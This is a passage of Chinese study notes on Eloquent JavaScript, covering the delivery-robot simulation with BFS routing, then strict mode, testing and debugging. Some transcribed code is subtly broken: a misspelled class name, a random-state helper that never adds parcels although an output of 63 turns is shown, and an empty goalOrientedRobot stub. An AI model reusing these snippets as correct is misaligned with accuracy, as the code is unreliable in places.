class="string">"Shop-Town Hall"</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>



<p>村子中的街道网络形成了一个图。图就是结点和边的集合。这个图将会是机器人活动的世界。</p>
<p>字符串数组不太容易处理。我们感兴趣的是从一个给定位置可以去向哪个终点。让我们转换街道列表到一个数据结构，给定一个位置，告诉我们可达的位置。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildGraph</span>(<span class="params">edges</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> graph = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addEdge</span>(<span class="params">from, to</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(graph[<span class="keyword">from</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">            graph[<span class="keyword">from</span>] = [to];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graph[<span class="keyword">from</span>].push(to);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  分离出每条边的起点和终点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> [<span class="keyword">from</span>, to] <span class="keyword">of</span> edges.map(<span class="function"><span class="params">edge</span> =&gt;</span> edge.split(<span class="string">"-"</span>))) &#123;</span><br><span class="line">        addEdge(<span class="keyword">from</span>, to);</span><br><span class="line">        addEdge(to, <span class="keyword">from</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 以起点字符串为键，终点数组为值的map数据结构</span></span><br><span class="line"><span class="keyword">const</span> roadGraph = buildGraph(roads);</span><br></pre></td></tr></table></figure>

<p>给定一个边数组，<code>buildGraph</code>创造一个map对象，对于每个结点，存储它相连的结点。</p>
<p>使用<code>split</code>方法分离他们为独立的字符串。</p>
<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>机器人将会在村子中行走。各个地方都有以某处为终点的包裹。机器人到一个地方拾起包裹，并当他们到达包裹目的地的时候投递他们。</p>
<p>机器人必须在每个点决定下一步去哪。当所有包裹投递完毕机器人完成任务。</p>
<p>为了模拟这个过程，我们必须定义一个描述它的虚拟世界。这个模型告诉我们机器人和包裹现在在哪。当机器人移动到别的地方，我们需要改变状态以反映出新的情况。</p>
<p>如果以面向对象的思维考虑，我们首先需要定义这个世界中的不同元素：一个机器人类，一个包裹类，可能还有一个place类。</p>
<p>这些类保存自己的当前状态，如在某个地方的包裹。当我们改变虚拟世界的时候状态就会改变。</p>
<p>这是错误的。</p>
<p>至少，通常是这样的。一个听上去像对象的东西不意味着应该是程序中的对象。自反性地为应用中的每个概念编写一个类，往往会给你一些相互关联的对象，并且每一个都有自己的内部的变化的状态。这样的程序很难去理解并很容易被破坏。</p>
<p>相反，让我们将村子的状态压缩至一个定义它的值的最小集。有机器人当前的位置，还有尚未投递的包裹，每一个包裹都有当前的为值和目的地地址。就是这样。</p>
<p>当机器人移动，我们不要改变状态而是计算出一个新的移动过后的状态。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VilliageState</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(place, parcels) &#123;</span><br><span class="line">        <span class="keyword">this</span>.place = place;</span><br><span class="line">        <span class="keyword">this</span>.parcels = parcels;</span><br><span class="line">    &#125;</span><br><span class="line">    move(destination) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!roadGraph[<span class="keyword">this</span>.place].includes(destination)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> parcels = <span class="keyword">this</span>.parcels.map(<span class="function"><span class="params">parcel</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(parcel.place == <span class="keyword">this</span>.place) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;<span class="attr">place</span>: destination, <span class="attr">address</span>: parcel.address&#125;;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> parcel;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).filter(<span class="function"><span class="params">parcel</span> =&gt;</span> parcel.address != parcel.place);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> VilliageState(destination, parcels);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>move</code>方法是行为真正发生的地方。首先检查是否终点可达，如果不可达，因为不是一次合法的move，所以直接返回。</p>
<p>然后根据机器人的新位置创造一个新的状态。但是也需要创造一个新的<code>parcels</code>。parcels在当前机器人位置的要被带到移动的位置，而我们投递那些parcel的place和address相同的包裹，这两步分别通过map和filter完成。</p>
<p>当parcel对象移动的时候，不会被改变，除了重新创造的时候。move方法给我们一个新的村子状态但是保持旧的状态保持不变。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> first = <span class="keyword">new</span> VillageState(</span><br><span class="line">  <span class="string">"Post Office"</span>,</span><br><span class="line">  [&#123;<span class="attr">place</span>: <span class="string">"Post Office"</span>, <span class="attr">address</span>: <span class="string">"Alice's House"</span>&#125;]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">let</span> next = first.move(<span class="string">"Alice's House"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(next.place);</span><br><span class="line"><span class="comment">// → Alice's House</span></span><br><span class="line"><span class="built_in">console</span>.log(next.parcels);</span><br><span class="line"><span class="comment">// → []</span></span><br><span class="line"><span class="built_in">console</span>.log(first.place);</span><br><span class="line"><span class="comment">// → Post Office</span></span><br></pre></td></tr></table></figure>

<p>move使得parcel被投递，这反映在下一个状态。但是初始状态仍然描述了机器人在邮局，并且包裹尚未投递。</p>
<h2 id="持久的数据（persistent-data）"><a href="#持久的数据（persistent-data）" class="headerlink" title="持久的数据（persistent data）"></a>持久的数据（persistent data）</h2><p>不变的数据结构叫做immutable或者是persistent的。它们表现得很像字符串和数字，不会在不同时刻包含不同的东西。</p>
<p>JS中几乎任何东西都能被改变，所以处理持久的值需要一些约束。有一个叫做<code>Object.freeze</code>的函数使得写对象属性被忽略。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> object = <span class="built_in">Object</span>.freeze(&#123;<span class="attr">value</span>: <span class="number">5</span>&#125;);</span><br><span class="line">object.value = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">console</span>.log(object.value);</span><br><span class="line"><span class="comment">// -&gt; 5</span></span><br></pre></td></tr></table></figure>

<p>为什么我要执意不改变对象呢？显然JS期望我们的对象是可变的。</p>
<p>因为这帮助理解我的程序。再一次关于复杂度管理。当对象在我的系统成为不变的稳定的事物，我就可以独立地考虑对他们的操作，也就是说，从某处移动到Alice的房子总是产生同样的新状态。当对象会随时间变化时，就会为这种类型的推理添加一个新的复杂维度。</p>
<p>对于我们这章构建的小型系统，我们可以处理这样的额外复杂度。但对于我们能构建怎样的系统，最重要的限制就是我们能理解多少。任何使得代码易读的东西都使得构建一个雄心勃勃的系统成为可能。</p>
<p>不幸的是，虽然理解一个构建在持久的数据结构上的系统是很容易的，但是设计一个却是有些难度的，尤其是 当编程语言不提供相关的支持的时候。我们将在这本书中寻找使用持久的数据结构的机会，但是我们也会使用可变的数据结构。</p>
<h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>投递机器人观察这个世界的状态决定他要去向何方。因此，我们可以说一个机器人是一个函数，接收<code>VillageState</code>对象并返回附近地方的名字。</p>
<p>因为我们想要机器人能记得东西，所以他们可以做出计划和执行计划，我们给他们传递一个memory并返回一个新的memory。因此，机器人返回的应该是一个包含移动的方向和一个memory的对象，这个memory将会在下次调用该函数的时候</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runRobot</span>(<span class="params">state, robot, memory</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> turn = <span class="number">0</span>; ; turn++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(state.parcels.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`Done in <span class="subst">$&#123;turn&#125;</span> turns`</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> action = robot(state, memory);</span><br><span class="line">        state = state.move(action.direction);</span><br><span class="line">        memory = action.memory;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Moved to <span class="subst">$&#123;action.direction&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考虑下机器人要做什么去解决一个给定的状态。它必须通过访问每个有包裹的地方收取所有的包裹，并且访问每个包裹地址指向的地方（但只能在收取包裹之后）。</p>
<p>最笨的策略就是机器人在每一轮随机选取方向。意味着有极大的困难性，最终会收取到所有的包裹并在某一时间点到达它们应被投递的地方。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomPick</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> choice = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * array.length);</span><br><span class="line">    <span class="keyword">return</span> array[choice];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomRobot</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">direction</span>: randomPick(roadGraph[state.place])&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Math.random()</code>返回了一个介于0和1之间的数字（总是小于1）。乘以数组长度给定了一个数组的随机索引。</p>
<p>因为机器人不需要记住任何事情，所以他忽略了第二个参数（JS函数对参数数量过多不会有任何怨言）并且忽略了返回对象中的<code>memory</code>属性。</p>
<p>为了让这个精细的机器人，我们首先一种用一些包裹创造一个新状态的方式。静态方法(在这里直接在构造器上添加一个属性）是个好地方去实现这种功能。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于为我们的函数实现一个随机用例</span></span><br><span class="line">VilliageState.random = <span class="function"><span class="keyword">function</span>(<span class="params">parcelCount = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> parcels = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; parcelCount; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> address = randomPick(<span class="built_in">Object</span>.keys(roadGraph));</span><br><span class="line">        <span class="keyword">let</span> place;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            place = randomPick(<span class="built_in">Object</span>.keys(roadGraph));</span><br><span class="line">        &#125; <span class="keyword">while</span> (place == address);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> VilliageState(<span class="string">"Post Office"</span>, parcels);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不向任何包裹的起终点是同一个地方。因为这种原因我们使用<code>do/while</code>循环去找到一个和终点不同的起始点。</p>
<p>让我们开启一个虚拟的世界。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">runRobot(VilliageState.random(), randomRobot);</span><br><span class="line"><span class="comment">// → Moved to Marketplace</span></span><br><span class="line"><span class="comment">// → Moved to Town Hall</span></span><br><span class="line"><span class="comment">// → …</span></span><br><span class="line"><span class="comment">// → Done in 63 turns</span></span><br></pre></td></tr></table></figure>

<p>将会花费很多轮去投递包裹，因为没有很好的提前做计划。我们将会很快解决这个问题。</p>
<h2 id="邮车的路线"><a href="#邮车的路线" class="headerlink" title="邮车的路线"></a>邮车的路线</h2><p>我们应该做的要比随机机器人更好。一个简单的改进就是从真实世界的邮件投递中汲取一些灵感。</p>
<p>如果我们找到一个经过村子中所有地方的路线，机器人可以走两次这条路线，就一定能保证投递完所有的包裹。这里是一个这样的路径（从邮局开始）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mailRoute = [</span><br><span class="line">  <span class="string">"Alice's House"</span>, <span class="string">"Cabin"</span>, <span class="string">"Alice's House"</span>, <span class="string">"Bob's House"</span>,</span><br><span class="line">  <span class="string">"Town Hall"</span>, <span class="string">"Daria's House"</span>, <span class="string">"Ernie's House"</span>,</span><br><span class="line">  <span class="string">"Grete's House"</span>, <span class="string">"Shop"</span>, <span class="string">"Grete's House"</span>, <span class="string">"Farm"</span>,</span><br><span class="line">  <span class="string">"Marketplace"</span>, <span class="string">"Post Office"</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>为了实现route-following机器人，我们需要充分利用机器人的memory。机器人每一轮丢掉第一个元素，并保持memory中剩下的路由。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">routeRobot</span>(<span class="params">state, memory</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(memory.length == <span class="number">0</span>) &#123;</span><br><span class="line">        memory = mailRoute;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">direction</span>: memory[<span class="number">0</span>], <span class="attr">memory</span>: memory.slice(<span class="number">1</span>)&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个机器人运行的快了些。将会花费最多26轮（13步路由的两倍）完成任务但通常会花费更少轮次。</p>
<h2 id="寻路"><a href="#寻路" class="headerlink" title="寻路"></a>寻路</h2><p>不过，我不会盲目地遵循一个固定的路线调用智能的行为。机器人如果能够根据实际需要做的工作调整它的行为将会变得更加高效。</p>
<p>为了实现这个，它必须有意朝着有包裹的地方移动或是朝着包裹要投递的地方移动。</p>
<p>通过图找路由的问题是典型的搜索问题。我们可以知道是否一个路由是合法的solution，但是不能像计算2+2一样直接计算solution。相反，我们不得不创造可能的solution知道我们找到一个合法的solution。</p>
<p>通过一个图的可能的路由是无穷的。但是当搜索A到B的路由时，我们只对那些起始于A的路由感兴趣。我们也不关心那些访问同一个地方两次的路由，因为无论在哪里肯定都不是最高效的路由。这就减少了寻路者要考虑的路由数量。</p>
<p>事实上，我们最感兴趣的是最短路由。所以我们想要确保在我们查看更长的路由之前先查看短路由。一个好的方法是从起始点增长路由，探索每个未访问的可达的地方，直到一个路由实现了目标。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findRoute</span>(<span class="params">graph, from, to</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> work = [&#123;<span class="attr">at</span>: <span class="keyword">from</span>, <span class="attr">route</span>: []&#125;];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; work.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123;at, route&#125; = work[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> place <span class="keyword">of</span> graph[at]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (place == to) <span class="keyword">return</span> route.concat(place);</span><br><span class="line">      <span class="keyword">if</span> (!work.some(<span class="function"><span class="params">w</span> =&gt;</span> w.at == place)) &#123;</span><br><span class="line">        work.push(&#123;<span class="attr">at</span>: place, <span class="attr">route</span>: route.concat(place)&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>探索必须以正确的顺序昨晚，到达的第一个地方必须首先被探索。我们不能一到一个地方就立刻探索，因为那意味着从那到达的地方也会立刻被探索。即使可能有其他的未被探索的更短的路径。</p>
<p>因此，函数保持了一个工作列表。这是一个应该下一次被探索的地方的数组，伴随着一个带我们去到那里的路由。开始于起点和一个空路由。</p>
<p>搜索首先获取列表中下一个元素并且探索所有从这个元素出去的，如果其中的某个是目标，路由列表可以被返回。否则，如果还没有访问过这个地方，一个新的元素将被添加到列表中。如果访问过，不需要继续做处理了。</p>
<p>我们的代码没有处理列表中没有更多的元素时的情况，因为我们知道我们的图是连通的，意味着每个地方都可以由其他地方到达。我们总是能找到两点间的路由，搜索永远不会失败。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goalOrientedRobot</span>(<span class="params">&#123;place, parcels&#125;, route</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ8</title>
    <url>/2019/01/04/EJ8/</url>
    <content><![CDATA[<h1 id="BUGs和ERRORs"><a href="#BUGs和ERRORs" class="headerlink" title="BUGs和ERRORs"></a>BUGs和ERRORs</h1><p>程序中的缺陷叫做bugs。如果一个程序是思想结晶的，可以将bug大致分为由困惑的想法导致的和由当将想法转换为代码时引入的错误。前者通常比后者更难诊断和修复。</p>
<a id="more"></a>

<h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>如果计算机知道足够多的信息关于我们要做的事情，那么许多错误可以自动被计算机指出。但是JS的松散性是一个障碍。它绑定和属性的概念是很模糊的以致于在运行程序之前几乎不会捕捉到拼写错误。即便是这样，它不带抱怨的允许你做一些明确无意义的事情，比如计算<code>true * &quot;monkey&quot;</code>。</p>
<p>不过还是有一些JS抱怨的东西。写一个不遵循JS语法的程序将使得计算机立刻做出抱怨。其他如调用一个非程序或者在underfined的值上查找一个属性，当程序尝试去执行行为的时候会导致一个报错。</p>
<p>但是通常情况下，你的无意义的计仅仅产生<code>NaN</code>或者一个<code>underfined</code>值，程序还是会继续快乐地进行，确信它自己正在做有意义的事情。这个伪值可能经过几个函数之后，错误才会出现。他可能不会触发错误，而只是静悄悄地使得程序输出是错误的。找到这样问题的源头有点困难。</p>
<p>寻找bugs的过程叫做<em>dubugging</em></p>
<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>JS通过开启严格模式可以变得更严格。通过在文件或者函数体顶部放一个<code>use strict</code>实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canYouSpotTheProblem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line">  <span class="keyword">for</span> (counter = <span class="number">0</span>; counter &lt; <span class="number">10</span>; counter++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Happy happy"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">canYouSpotTheProblem();</span><br><span class="line"><span class="comment">// → ReferenceError: counter is not defined</span></span><br></pre></td></tr></table></figure>

<p>一般地，当忘记了在绑定前加一个<code>let</code>，如同例子中的<code>counter</code>这样，JS静默的创造一个全局绑定。相反地，严格模式下会报错。这是很有用的。即便这样，如果例子中的绑定一个有一个全局绑定的时候这种方法是无效的。在那种情况下，循环将悄悄覆盖绑定的值。</p>
<p>在严格模式下，另一个变化是当函数没有被当作方法调用时，函数中的<code>this</code>绑定为<code>underfined</code>。当在严格模式外做这样的调用时，<code>this</code>指的是全局作用域。所以如果在严格模式下意外地错误地调用一个方法或者构造器，一旦尝试从<code>this</code>中读取什么的时候将立刻产生一个错误，而不是写入全局作用域。</p>
<p>例如，考虑下面的代码，没有使用<code>new</code>关键字调用构造器函数，所以这个<code>this</code>将不会指代新创建的对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"><span class="keyword">let</span> ferdinand = Person(<span class="string">"Ferdinand"</span>); <span class="comment">// oops</span></span><br><span class="line"><span class="built_in">console</span>.log(name);</span><br><span class="line"><span class="comment">// → Ferdinand</span></span><br></pre></td></tr></table></figure>
<p>所以这个对构造器<code>Person</code>的伪调用成功了，但是返回了一个<code>undefined</code>值并且创造了一个全局绑定<code>name</code>。在严格模式下，结果是不同的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"><span class="keyword">let</span> ferdinand = Person(<span class="string">"Ferdinand"</span>); <span class="comment">// forgot new</span></span><br><span class="line"><span class="comment">// → TypeError: Cannot set property 'name' of undefined</span></span><br></pre></td></tr></table></figure>
<p>我们被立刻告知有什么东西出错了，这是很有用的。</p>
<p>幸运的是，以<code>class</code>标记创造的构造器如果不用<code>new</code>调用将总是会抱怨，使得即便不是在严格模式下这也不成问题。</p>
<p>严格模式可以做更多的事情。它不允许给定一个函数多个同名的参数并完全移除了一些有问题的语言特性（如<code>with</code>语句）</p>
<p>简言之，将<code>use strict</code>放在程序顶部无伤大雅并且帮助你发现问题。</p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>一些语言在运行程序之前想要直到所有的绑定和表达式的类型。当一个类型以一种不一致的方式使用的时候将会立刻告诉你。JS只在实际运行程序的时候才考虑类型，并且即使在运行实际程序时，也经常尝试隐式转换值到它期望的类型，所以这没有多大帮助。</p>
<p>然而，类型提供了一个讨论程序的有用的框架。许多错误来自于对函数接收和输出的值的类型的困惑。如果将这些信息写下，可能就不那么容易困惑。</p>
<p>你可以在前面章节的<code>goalOrientedRobot</code>函数前添加下面的注释来描述它的类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (VillageState, Array) → &#123;direction: string, memory: Array&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goalOrientedRobot</span>(<span class="params">state, memory</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有许多不同的规范用类型注解JS的程序。</p>
<p>关于类型的一件事情是，它们需要引入自己的复杂度以便能够描述足够有用的代码。你认为返回数组中随即元素的<code>randomPick</code>函数的参数和返回值类型应该是什么呢？你需要引入一个类型变量<code>T</code>，可以代表任何类型，所以可以给<code>randomPick</code>一个类似于<code>([T]) -&gt; T</code>的类型（从Ts数组到T的函数）。</p>
<p>当程序的类型已知的时候，计算机为你检查类型是可能的，在程序运行之前指出错误。有许多JS方言添加了类型到语言中并且检查它们。最受欢迎的是TS，如果你对添加更多严格感兴趣，我推荐你尝试一下。</p>
<p>这本书中，我们将继续使用原生，危险，无类型的JS代码。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>如果语言不能够在帮助我们发现错误上做很多事情，我们将不得不以很艰难的方式找到它们：通过运行程序然后观察是否做正确的事情。</p>
<p>重复地手工操作这个真的是一个坏主意。不仅很讨厌，而且每次改变程序的时候都要测试所有事情实在是很低效。</p>
<p>计算机擅长做重复的任务，并且测试是一个理想的重复的任务。自动化测试是编写一个程序测试另外一个程序的过程。书写测试需要比手动测试做更多的更多的工作，但是一旦完成，就收获了超能力：只需要几秒钟就可以确认在测试所针对的情况里，你的程序是否表现得正常。当打破什么东西的时候，你将会立刻注意到，而不是在之后的某个时间里，随机的碰见这个问题。</p>
<p>测试通常采用小的标记程序的方式验证代码的某些方面。例如，一组针对<code>toUpperCase</code>的测试可能看起来是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">label, body</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!body()) <span class="built_in">console</span>.log(<span class="string">`Failed: <span class="subst">$&#123;label&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="string">"convert Latin text to uppercase"</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"hello"</span>.toUpperCase() == <span class="string">"HELLO"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">test(<span class="string">"convert Greek text to uppercase"</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"Χαίρετε"</span>.toUpperCase() == <span class="string">"ΧΑΊΡΕΤΕ"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">test(<span class="string">"don't convert case-less characters"</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"مرحبا"</span>.toUpperCase() == <span class="string">"مرحبا"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>书写类似这样的测试可能产生重复的尴尬的代码。幸运的是，存在帮助你构建和运行测试集的软件，这种软件通过提供一种合适的语言（以函数和方法形式）去表达测试并且当测试失败的时候输出提示性的信息。这些通常被叫做测试运行器（<em>test runner</em>)。</p>
<p>一些代码相比于其他代码更容易测试。通常来说，代码交互的外部对象越多，建立测试的上下文就越困难。前面章节的编程风格，使用了自包含的持久的值而不是变化的对象，比较容易去测试。</p>
<h2 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h2><p>一旦由于程序表现异常或者产生错误，你发现你的程序产生了问题，下一步就是找到问题在哪里。</p>
<p>有时很显然。错误信息将会指出程序特定的一行，并且如果查看错误描述和对应行的代码，你通常可以发现问题。</p>
<p>但是不总是这样。有时触发问题的原因仅仅是在某处产生的奇怪的值被以一种不合法的方式使用了。</p>
<p>下面的例子程序，通过重复取得最后一位然后划分这个数字去除最后一位，将一个整数转换为一个给定基数的字符串。但是这个奇怪的输出表明有个bug。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">numberToString</span>(<span class="params">n, base = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">""</span>, sign = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    sign = <span class="string">"-"</span>;</span><br><span class="line">    n = -n;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    result = <span class="built_in">String</span>(n % base) + result;</span><br><span class="line">    n /= base;</span><br><span class="line">  &#125; <span class="keyword">while</span> (n &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> sign + result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(numberToString(<span class="number">13</span>, <span class="number">10</span>));</span><br><span class="line"><span class="comment">// → 1.5e-3231.3e-3221.3e-3211.3e-3201.3e-3191.3e-3181.3…</span></span><br></pre></td></tr></table></figure>

<p>即使你已经发现了问题，也要假装你并没有发现。我们知道我们的程序出故障了，并且想要知道原因。</p>
<p>在这种情况下，你必须克制强烈的欲望去随即改变代码然后观察是否那使得它变得更好。相反，<em>think</em>。分析发生了什么并且想出发生这种现象的可能的原因。然后，做额外的观察去测试这个理论。或者，如果你还没有一套理论，做额外的观察去帮助你想出一个。</p>
<p>放置一些策略上的<code>console.log</code>调用到程序中，是一个查看程序中发生了什么的好的方式。在这种情况下，我们想要<code>n</code>接收值13和1，然后是0。让我们在循环开始写下它的值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">1.3</span></span><br><span class="line"><span class="number">0.13</span></span><br><span class="line"><span class="number">0.013</span></span><br><span class="line">…</span><br><span class="line"><span class="number">1.5e-323</span></span><br></pre></td></tr></table></figure>

<p>13除以10不会产生一个整数。我们实际想要的是<code>n = Math.floor(n / base)</code>而不是<code>n /= base</code>，如此一来这个数就能够恰当地向右移位。</p>
<p>用<code>console.log</code>去观察程序行为的一个替代就是浏览器的*debugger`能力。浏览器可以在代码特定的某一行设置一个断点，并且可以检查绑定的值在那个点上。我不会涉及太多细节，因为不同浏览器的debugger都不太相同，可以在开发者工具或者在网上搜索更多信息。</p>
<p>另外一种设置断点的方式是在你的程序中包含一个<code>debugger</code>语句（简单包含这个关键字）。如果浏览器的开发者工具激活了，程序将会停在这个语句。</p>
<h2 id="错误传播（error-propagation）"><a href="#错误传播（error-propagation）" class="headerlink" title="错误传播（error propagation）"></a>错误传播（error propagation）</h2><p>并非所有的问题都可以被编程者避免。如果你的程序以某种方式和外界进行通信，就可能出现输入格式不正确，负载过重或者是网络故障的情况。</p>
<p>如果你是为自己编程，可以忽略这些问题直到它们出现。但是如果你需要构建要被他人使用的东西，你通常想要程序表现得更好而不是崩溃。有时跳过错误的输入并继续运行是正确的要做的事情。在其他情况下，报告给用户哪里出错并且然后放弃。但是在任何一种情况下，程序不得不积极地做一些事情响应问题。</p>
<p>假设你有一个函数<code>promptInteger</code>，向用户请求一个整数并返回它。如果用户输入”orange”，它应该返回什么？</p>
<p>一个选择是使它返回一个特殊值。常规的这样的值是<code>null</code>，<code>undefined</code>或者-1。</p>
